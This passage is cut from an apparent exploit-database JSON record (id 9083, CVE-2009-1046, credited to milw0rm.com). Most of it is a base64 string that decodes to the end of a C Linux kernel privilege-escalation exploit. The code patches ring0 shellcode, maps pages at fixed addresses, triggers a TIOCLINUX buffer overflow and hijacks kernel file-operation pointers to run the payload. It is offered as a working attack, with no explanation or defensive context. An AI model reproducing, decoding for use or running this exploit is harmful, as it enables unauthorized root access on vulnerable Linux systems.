iAgICByZXR1cm4gMTsNCiAgfQ0KDQogIF9fbXNnX2YoIlsqKl0gUGF0Y2hpbmcgcmluZzAgc2hlbGxjb2RlIHdpdGggdXNlcnNwYWNlIGFkZHI6ICVwXG4iLCByaW5nMGMpOw0KICBwYXRjaCA9IChfX3U2NCopKHJpbmcwICsgQ0pVTVBfT0ZGKTsNCiAgKnBhdGNoID0gKF9fdTY0KXJpbmcwYzsNCg0KICBfX21zZ19mKCJbKipdIFVzaW5nIHBvcnQ6ICVkXG4iLCBzcnZwb3J0KTsNCiAgX19tc2coIlsqKl0gR2V0dGluZyBzbGFiIGluZm8uLi5cbiIpOw0KICBrbWFsbG9jX2ZkID0gZ2V0X2ttYWxsb2NfZmQoKTsNCiAgaWYoIWdldF90b3RhbF9vYmplY3Qoa21hbGxvY19mZCkpIA0KICAgIF9fZmF0YWwoIlshIV0gT25seSBTTFVCIGFsbG9jYXRvciBzdXBwb3J0ZWRcbiIpOw0KIA0KDQogIF9fbXNnKCJbKipdIE1hcHBpbmcgU2VnbWVudHMuLi5cbiIpOyANCiAgX19tc2coIlsqKl0gVHJ5aW5nIG1hcHBpbmcgc2FmZSBwYWdlLi4uIik7DQogIGlmKGRvX21tYXAoU1RSVUNUX1BBR0UsIDEpIDwgMCkNCiAgew0KICAgIF9fbXNnKCJQYWdlIFByb3RlY3Rpb24gUHJlc2VudCAoVW5hYmxlIHRvIE1hcCBTYWZlIFBhZ2UpXG4iKTsNCiAgICBfX21zZygiWyoqXSBNYXBwaW5nIEhpZ2ggQWRkcmVzcyBQYWdlIChkb250IGtpbGwgcGxhY2Vob2xkZXIgY2hpbGQpXG4iKTsNCiAgICBpZihkb19tbWFwKFNUUlVDVF9QQUdFX0FMVCwgMSkgPCAwKQ0KICAgICAgX19mYXRhbF9lcnJubygibW1hcCIpOyANCg0KICAgIGNhbmtpbGw9MDsgIC8qIGRvbnQga2lsbCBjaGlsZCBvd25pbmcgdW5zYWZlIGZkcy4uICovDQogICAgaGlnaHBhZ2U9MTsgLyogc3NubWFwIGluIGhpZ2hlciBwYWdlcyAqLw0KICAgIHpzdHJlYW09U1RSRUFNX1pFUk9fQUxUOyANCiAgfSANCiAgZWxzZQ0KICAgIF9fbXNnKCJEb25lXG4iKTsNCg0KICBfX21zZygiWyoqXSBNYXBwaW5nIENvZGUgUGFnZS4uLiAiKTsNCiAgaWYoZG9fbW1hcChDT0RFX1BBR0UsIDEpIDwgMCkNCiAgICBfX2ZhdGFsX2Vycm5vKCJtbWFwIik7DQogIGVsc2UNCiAgICBfX21zZygiRG9uZVxuIik7DQoNCiAgbWVtY3B5KCh2b2lkKilDT0RFX1BBR0UsIHJpbmcwLCBzaXplb2YocmluZzApKTsNCg0KICBfX21zZygiWyoqXSBCaW5kaW5nIG9uIENQVSAwXG4iKTsgDQogIGJpbmRjcHUoKTsgDQoNCiAgX19tc2coIlsqKl0gU3RhcnQgU2VydmVyIFRocmVhZC4uXG4iKTsNCiAgY2hpbGQgPSBzdGFydF9saXN0ZW5lcigpOw0KICBzbGVlcCgzKTsgDQogIA0KICBkb19zb2Nrcygmc2VydmVyX3MsIHpzdHJlYW0pOw0KICBmb3IoaT0wOyBpPDc7IGkrKykNCiAgew0KICAgIGNsb3NlKGdfYXJyYXlbOC0xLWldKTsgIA0KICB9DQogIGNscigxKTsgDQogIGFsbG9jX3Rpb2NsaW51eCgpOyAvLyB0cmlnZ2VyIG92ZXJmbG93DQogIHBlZXJ4ID0gY3JlYXRlX2FuZF9pbml0KCk7DQogIGNvbm5lY3RfcGVlcihwZWVyeCwgJnNlcnZlcl9zKTsNCiAgcGVlcnkgPSBjcmVhdGVfYW5kX2luaXQoKTsNCiAgY29ubmVjdF9wZWVyKHBlZXJ5LCAmc2VydmVyX3MpOw0KICANCiAgc2xlZXAoMSk7DQoNCiAgdW5zYWZlX2ZkWzBdID0gcGVlcng7DQogIHVuc2FmZV9mZFsxXSA9IGdfYXJyYXlbOF07DQogIHVuc2FmZV9mZFsyXSA9IHBlZXJ5Ow0KICB1bnNhZmVfZmRbM10gPSBnX2FycmF5WzldOw0KIA0KICBfX21zZygiXG4iKTsgDQogIF9fbXNnX2YoIlsqKl0gVW1hcHBlZCBlbmQtdG8tZW5kIGZkOiAlZFxuIiwgZmRfem1hcF9zcnYpOyANCiAgX19tc2dfZigiWyoqXSBVbnNhZmUgIGZkOiAoICIpOw0KDQogIGZvcihpPTA7IGk8NDsgaSsrKQ0KICAgIF9fbXNnX2YoIiVkICIsIHVuc2FmZV9mZFtpXSk7DQogIF9fbXNnKCIpXG4iKTsgDQogIA0KDQogIF9fbXNnKCJbKipdIEhpamFja2luZyBmb3BzLi4uXG4iKTsNCiAgb3ZlcndyaXRlX2ZvcHMoZmRfem1hcF9zcnYsICZjYWRkciwgcGVlcnkpOw0KDQogIC8qIGlmIHUgZ2V0IGhlcmUuLiBzb21ldGhpbmcgbmFzdHkgaGFwcGVucy4uLm1heSBjcmFzaC4uKi8NCiAgX19mcmVlX3N0dWZmKCk7DQogIF9fbXNnKCJbKipdIEV4cGxvaXQgZmFpbGVkLi4gZnJlZXppbmcgcHJvY2Vzc1xuIik7DQogIGtpbGwoZ2V0cGlkKCksIFNJR1NUT1ApOw0KICByZXR1cm4gMDsNCn0NCg0KI2VuZGlmDQoNCi8vIG1pbHcwcm0uY29tIFsyMDA5LTA3LTA5XQ==", 
    "id": "9083", 
    "cves": [
        "CVE-2009-1046"
    ]
}